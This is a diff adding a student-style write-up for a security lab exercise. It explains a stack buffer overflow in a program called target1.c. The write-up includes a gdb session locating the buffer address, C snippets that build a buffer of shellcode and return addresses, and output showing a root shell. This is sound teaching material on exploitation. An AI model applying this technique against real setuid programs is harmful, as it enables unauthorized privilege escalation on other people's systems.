@@ -1,0 +1,120 @@
+##
+## sploit1.txt for pp1 in /home/user/pp1/sploits/
+## 
+## Made by pierre-louis gottfrois
+## Made by pierre fourgeaud
+## 
+## Started on  Sat Jun 03 19:06:57 2012 pierre-louis gottfrois
+##
+
+I ________________________________
+-=(^^)=- THE BUFFER OVERFLOW
+
+Here the buffer overflow was pretty obvious. Just take a look at target1.c and
+locate the strcpy call. We see that the function wants to copy a string into
+a buffer with only 200 bytes allocated. What will happen if we try to copy more
+than 200 bytes ?
+
+Let's try.
+
+$> /tmp/target1 "`printf '%0600d'`"
+Segmentation fault
+$>
+
+Alright, it's time now to play ;)
+
+II _______________________________
+-=(^^)=- THE EXPLOIT
+
+So we know that our software has a buffer overflow in the function `foo` when
+trying to copy more bytes that the destination buffer can handle. Our goal is
+to try to execute a (root) shell by taking over the return address of the
+`strcpy` function call.
+
+How can we do that ?
+
+We are going to use the shell-code provided to create a "bad" string that we
+will pass to the targeted program. In order for our shell-code to be executed,
+we need to write in our "bad" buffer the start address of our "bad" buffer as
+much as possible. This will overflow the stack with this address and change
+the "Return Address" located on the stack to our address (pointing to our
+"bad" buffer with the shell-code).
+
+    - buff (our bad string)
+    - Assuming S is the shell-code and A the address we want to jump to
+    - ebp = Frame Pointer
+    - eip = Return Address (our goal !)
+
+    +--------+-+-+-+-- ... -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- ... -+-+-----+-----+
+    | MEMORY |S|S|S|S  ...  |S|A|A|A|A|A|A|A|A|A|A|A|A|A|  ...  |A| ebp | eip |
+    +--------+-+-+-+-- ... -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- ... -+-+-----+-----+
+              ^
+             |-------- ... ---|--------------------------- ... ---|
+                    45 bytes              strlen(buff) - 45
+
+Alright, first we are going to overflow the buff by 100 bytes. No particular
+reason for this choice, other than this is the most common value in our
+readings.
+
+Our buff size is 300 bytes long.
+
+The first thing we need to do, is to find the address of our shell-code.
+Let's run both programs using gdb.
+
+$> gdb -silent -e sploit1 -s /tmp/target1
+(gdb) catch exec
+Catchpoint 1 (exec)
+(gdb) r
+Starting program: /home/user/pp1/sploits/sploit1 
+Executing new program: /proc/3101/exe
+/proc/3101/exe: Permission denied.
+(gdb) break 9
+Breakpoint 2 at 0x8048452: file target1.c, line 9.
+(gdb) c
+Continuing.
+[New process 3101]
+[Switching to process 3101]
+
+Breakpoint 2, foo (
+    arg=0xbffffc80 "\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200???\200????\037^\211v\b1?\210F\a\211F\f?\v\211?\215N\b\215V\f?\2001?\211?@?\200?????/bin/sh???\200???\200???\200???\200???\200???\200???"...) at target1.c:9
+9	}
+(gdb) p &buf
+$1 = (char (*)[200]) 0xbffffc80
+(gdb)
+
+The break point was set just AFTER the strcpy function call.
+This way we can see the buffer address: 0xbffffc80.
+Notice that the buffer contains our shell-code ;)
+
+This is the address we are going to use in order to jump into our
+shell-code instead of returning where ever it was going to return.
+
+Let's copy this address in our "bad" buffer:
+
+sploit1.c
+
+  addr = 0xbffffc80;
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+Now, let's copy the 45 bytes of the shell-code
+inside our "bad" buffer (from the beginning):
+
+sploit1.c
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+  buff[bsize - 1] = '\0';
+  
+All we have to do now is to launch the exploit and enjoy our (root) shell :)
+
+$> whoami
+user
+$> ./sploit1
+sh-3.2# whoami
+root
+sh-3.2#
